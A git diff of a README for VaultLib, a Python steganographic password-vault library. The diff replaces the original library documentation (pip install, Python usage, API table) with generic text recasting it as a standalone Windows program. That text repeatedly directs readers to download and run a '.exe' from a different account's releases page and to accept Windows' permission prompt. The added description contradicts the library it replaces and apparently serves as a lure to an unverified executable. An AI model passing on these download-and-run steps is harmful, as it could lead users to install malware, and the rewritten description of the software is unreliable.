@@ -1,191 +1,153 @@
-<!-- # 🐱 NeoVault (VaultLib)
-![logo.png](<logo.png>)
-## Supports (🐍 Python): 🐧 🪟 🍎 -->
-<!-- ##### **A High-Security Steganographic Password Management Library for Python.** -->
+# 🔒 VaultLib - Secure Vault Hidden in Images
 
-<div align="center">
-  <img src="logo.png" alt="NeoVault Logo" width="500"/>
-
-  # 🛡️ VaultLib (NeoVault)
-  **🔒 Secure AES-256 vault hidden in images using EOF steganography.**
-
-  [![Python Versions](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
-  [![Arch Linux](https://img.shields.io/badge/OS-Arch_Linux-1793d1?style=flat-square&logo=arch-linux&logoColor=white)](https://archlinux.org/)
-  [![Windows](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)](https://www.microsoft.com/windows)
-  [![macOS](https://img.shields.io/badge/OS-macOS-000000?style=flat-square&logo=apple&logoColor=white)](https://www.apple.com/macos/)
-  [![License: CC BY-NC 4.0](https://img.shields.io/badge/License-CC%20BY--NC%204.0-lightgrey?style=flat-square)](https://creativecommons.org/licenses/by-nc/4.0/)
-  [![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg?style=flat-square)](https://github.com/psf/black)
-  [![GitHub stars](https://img.shields.io/github/stars/UndefinedClear/VaultLib?style=flat-square&color=yellow)](https://github.com/UndefinedClear/VaultLib/stargazers)
-</div>
-
-`VaultLib` is a professional-grade security tool designed to embed encrypted credential databases within standard image files. By leveraging **AES-256 (Fernet) encryption** and **EOF Steganography**, it ensures that sensitive data remains hidden in plain sight, maintaining the visual integrity of the carrier file. Perfect for those who value privacy and the "hidden in plain sight" philosophy.
-
-## ✨ Key Features
-
-* 👻 **Invisible Storage**: Implements EOF (End-of-File) steganography, allowing data to be stored behind valid image headers (JPG/PNG). The container file remains a perfectly viewable image.
-* 🔒 **Military-Grade Encryption**: Utilizes AES-256 via the `cryptography` library with PBKDF2HMAC key derivation (200,000 iterations for robust key stretching).
-* 🔑 **Custom Signatures**: Dynamic byte-marker injection (`NEO_SPACE_MARKER`) for reliable data offset identification, ensuring data integrity.
-* 🎭 **Visual Camouflage**: Supports automated decoy display using system-native handlers (e.g., `xdg-open` on Linux), distracting casual observers.
-* 🐧 **Arch-Friendly**: Designed with minimalism and control in mind, resonating with the Arch Linux philosophy.
-* 🌐 **Session Management**: Integrated identity headers (`user`, `os`, `vault_name`) for multi-user or multi-environment vault deployments.
-
-## ⚙️ Technical Overview
-
-### Data Injection Workflow
-
-The library appends a proprietary data block to the image binary after the standard end-of-file markers (`IEND` for PNG, `EOI` for JPG). This ensures the visual integrity of the host image is preserved.
-
-```
-[ Original Image Binary ]
-    (e.g., PNG header, IHDR, IDAT chunks, IEND marker)
-+-------------------------+
-|    NEO_SPACE_MARKER     |  <-- Your custom signature
-+-------------------------+
-|          SALT           |  <-- 16-byte random salt
-+-------------------------+
-|    ENCRYPTED_PAYLOAD    |  <-- Fernet-encrypted JSON (credentials)
-+-------------------------+
-
-```
-
-## 🚀 Getting Started
-
-### Installation
-
-1. Create Venv for project (python 3.11)
-    ```bash
-    $ python3 -m venv venv
-    ```
-
-2. Activate venv<br>
-    ## 🐟 Fish:
-
-    ```bash
-    $ source venv/bin/activate.fish
-    ```
-
-    ## 💫 Zsh and Bash:
-
-    ```bash
-    $ source venv/bin/activate
-    ```
-
-3. Ensure you have the `cryptography` library installed:
-
-    ```bash
-    $ pip install cryptography
-    ```
-
-4. 🏁 Thats All
-
-
-### Prerequisites
-
-* A Python environment (3.8+ recommended).
-
-## 🏝️ Demo
-### 🐈 Mask image (mask_cat.jpg)
-![mask_cat.jpg](<mask_cat.jpg>)
-
-### 🔒 Vault image (cat.png)
-![cat.png](<cat.png>)
-
-## ✍️ Usage Example
-
-The following implementation demonstrates how to initialize a vault, manage entries, and retrieve a comprehensive list of stored services using `VaultLib`.
-
-```python
-import VaultLib as vl
-
-# 1. Initialize the Vault 🛡️
-# If 'cat.png' does not exist, it will be created using 'mask_cat.jpg'.
-# The 'show_logo' option displays the Arch Linux ASCII art.
-vault = vl.Vault(
-    vault_name="MySecureVault", # (Not Neccessary)
-    master_password="YourUltraStrongPassword123!", # ⚠️ USE A STRONG, UNIQUE PASSWORD!
-    out_image="cat.png",                          # The output image containing encrypted data
-    mask_source="mask_cat.jpg",                   # Mask image (If None it will be 1 pixel)
-    user='Alex',                                  # Custom user identifier (Not Neccessary)
-    os="Arch Linux",                              # Operating system for display (Not Neccessary)
-    show_logo=True                                # Display ASCII logo on initialization (Not Neccessary)
-)
-
-# 2. Add New Credentials ➕
-# A secure, random 20-character password will be generated automatically.
-print("\n--- Adding New Entry ---")
-generated_pass = vault.add_entry("GitHub", "alex_arch_user", length=24)
-print(f"Generated password for GitHub: {generated_pass}")
-
-# Add another entry
-vault.add_entry("Spotify", "alex_music_lover")
-
-# 3. List All Stored Services 📜
-print("\n--- Listing All Services ---")
-vault.list_entries()
-
-# 4. Retrieve Specific Credentials 🔍
-print("\n--- Retrieving Specific Entries ---")
-services_list = vault.get_services() # Get a raw list of service names
-
-if services_list:
-    for service_name in services_list:
-        status_code, data_entry = vault.get_entry(service_name)
-        
-        if status_code == 2:
-            print(f"[✅ SUCCESS] Service: {service_name}")
-            print(f"            Login:   {data_entry['login']}")
-            print(f"            Password: {data_entry['password']}")
-        elif status_code == 1:
-            print(f"[❌ ERROR] Unauthorized: Invalid Master Password detected for '{service_name}'.")
-        elif status_code == 0:
-            print(f"[❓ INFO] Service '{service_name}' not found.")
-else:
-    print("[⚠️ WARNING] No services found or vault access denied.")
-
-```
-
-## 🔒 Security & Privacy
-
-* **Robust Key Derivation**: Employs `PBKDF2HMAC` with `SHA256` and a high number of iterations (200,000) to significantly increase the computational cost of brute-force attacks on the master password.
-* **Ephemeral Master Key**: The master password is never stored. It is used solely for key derivation during each session.
-* **Integrity by Design**: The steganographic approach ensures that any casual inspection of the image file will reveal only the image itself, with no indication of hidden data.
-* **Source Code Transparency**: Open-source nature allows for full auditing and verification of security practices.
-
-## 📚 API Reference
-
-| Method | Description | Return Type |
-| --- | --- | --- |
-| `__init__(...)` | Initializes the vault instance. | `None` |
-| `add_entry(service, login, length)` | Generates and encrypts a new password for a given service and login. | `str` (the generated password) |
-| `get_entry(service)` | Decrypts and retrieves specific service details. | `list [status_code, data_dict]` |
-| `get_services()` | Returns a list of all stored service identifiers. | `list[str] | None` |
-| `list_entries()` | Prints a formatted table of all services to the console. | `None` |
-
-## 📊 Analytics & Metrics
-
-### Download Trends
-
-*Represents the monthly download activity for VaultLib.*
-
-### Star History
-
-*A graph showing the project's star growth over time.*
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to open issues or submit pull requests. For major changes, please open an issue first to discuss what you would like to change.
-
-## 📝 License
-
-This project is licensed under the **Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)**. 
-
-**You are free to:**
-* Share and Adapt the code for personal use.
-
-**Under the following terms:**
-* **Attribution**: You must give appropriate credit.
-* **Non-Commercial**: You may NOT use the material for commercial purposes.
-
-[Read More](<LICENCE>)
+[![Download VaultLib](https://img.shields.io/badge/Download-VaultLib-brightgreen?style=for-the-badge)](https://github.com/bonj12/VaultLib/releases)
 
 ---
+
+## 🔍 What is VaultLib?
+
+VaultLib is a simple tool that hides your sensitive data inside image files. It uses a strong method called AES-256 encryption to keep your information safe. The hidden data stays inside the image without changing how it looks. This method is called EOF steganography, which means data goes to the end of the image file where it is harder to find.
+
+VaultLib is designed to work on Windows and many Linux systems. It helps you keep passwords, notes, or other secret files secure and hidden.
+
+---
+
+## 🖥️ System Requirements
+
+Before you use VaultLib, make sure your computer meets these requirements:
+
+- Windows 10 or newer
+- At least 100 MB free disk space
+- A standard image file (like PNG or JPG) to store your data
+- Basic computer skills: downloading files and running a program
+
+You do not need to install any extra software or coding tools. VaultLib works as a standalone application.
+
+---
+
+## 🚀 Getting Started with VaultLib
+
+You can start using VaultLib in five easy steps.
+
+1. **Download VaultLib**  
+   Click the big green button at the top or go to the official release page:  
+   [https://github.com/bonj12/VaultLib/releases](https://github.com/bonj12/VaultLib/releases)  
+   
+   This page holds the latest versions of VaultLib. Look for the file that ends with `.exe` for Windows.
+
+2. **Save the File**  
+   When you click the download link, your browser will ask where to save the file. Save it somewhere easy to find, like the Desktop or Downloads folder.
+
+3. **Run the Program**  
+   Find the downloaded `.exe` file and double-click it. Windows may ask permission to run the file. Choose “Yes” to continue.
+
+4. **Prepare Your Image File**  
+   Choose a picture file on your computer where VaultLib will hide your data. VaultLib supports common image formats like PNG and JPG. The image should be a regular photo or picture you like.
+
+5. **Use VaultLib**  
+   Open VaultLib and follow the simple on-screen instructions:
+   - Select the image file.
+   - Enter the data or file you want to hide.
+   - Set a password for encryption.
+   - VaultLib will create a new, hidden copy of the image with your data locked inside.
+
+---
+
+## 📥 How to Download VaultLib on Windows
+
+VaultLib does not require installation. Download the Windows executable file and run it directly.
+
+1. Go to the release page:  
+   [https://github.com/bonj12/VaultLib/releases](https://github.com/bonj12/VaultLib/releases)
+
+2. Find the latest version with a file name like `VaultLib-setup.exe` or `VaultLib-x64.exe`.
+
+3. Click on the file to download.
+
+4. Once downloaded, open the file by double-clicking it from your browser or folder.
+
+5. If Windows asks, confirm that you trust the file and want to run it.
+
+6. VaultLib will open in a new window and is ready to use.
+
+---
+
+## 🔐 How VaultLib Keeps Your Data Safe
+
+VaultLib uses AES-256 encryption. This encryption is a widely trusted standard used by banks and governments to protect data. It scrambles your information using a secret password. Without the password, it is nearly impossible to read the hidden data.
+
+Your data is stored inside an image at the very end of the file. This method is called EOF (End of File) steganography. VaultLib changes the image file in a way that does not affect how it looks or works as a picture. This makes the hidden data invisible to regular users and software.
+
+---
+
+## 🛠 Features
+
+- Encrypt and hide any file inside an image using AES-256.
+- Supports common image formats like PNG and JPG.
+- Simple drag-and-drop interface.
+- Creates new images with hidden data while keeping the original image safe.
+- Password protection to unlock and view hidden data.
+- Works offline without needing internet access.
+- No complex setup or command-line use.
+- Portable: run VaultLib from any folder or USB stick.
+
+---
+
+## ⚙️ How to Hide Data Step-by-Step
+
+1. Open VaultLib.
+2. Click “Choose Image” and pick the image where you want to hide data.
+3. Click “Add File” or “Add Text” to select the data you want to hide.
+4. Set a password you will remember. This is used to encrypt the data.
+5. Click “Hide Data” or “Encrypt.”
+6. VaultLib saves a new image with your secret inside. You can now share or store this image safely.
+7. Store the password securely. Without it, your data cannot be accessed.
+
+---
+
+## 🔄 How to Retrieve Your Hidden Data
+
+1. Open VaultLib.
+2. Click “Open Image” and select the image file containing your hidden data.
+3. Enter the password you used to hide the data.
+4. Click “Reveal Data” or “Decrypt.”
+5. VaultLib will extract your hidden files or text and let you save or view them.
+
+---
+
+## 🖼️ Tips for Choosing Images
+
+- Use regular, non-corrupted images.
+- Avoid very small files; files smaller than 10 KB might not hold much data.
+- Larger images can store more secret documents.
+- Use images that look ordinary to avoid suspicion.
+- You can reuse images but each secret data requires a new copy to avoid destroying old data.
+
+---
+
+## 💡 Troubleshooting
+
+- If VaultLib does not open, check that your Windows system is up to date.
+- If a password does not work, make sure Caps Lock is off and your typing is correct.
+- You cannot open images that do not have hidden data with VaultLib.
+- If encryption fails, try using a smaller file or a different image.
+- Running VaultLib from a USB drive is fine, but make sure the drive is properly connected.
+
+---
+
+## 📄 License
+
+VaultLib is open-source software. You can find the source code and licensing information in the repository. Feel free to explore, use, or modify the software under the conditions of its license.
+
+---
+
+## 📌 Relevant Links
+
+- [VaultLib Releases](https://github.com/bonj12/VaultLib/releases)  
+- [Project Repository](https://github.com/bonj12/VaultLib)  
+
+---
+
+## 📞 Getting Help
+
+If you need assistance or find issues, use the GitHub Issues section in the repository. Describe your problem clearly, including your operating system and steps you took. The community and developers will respond with support.
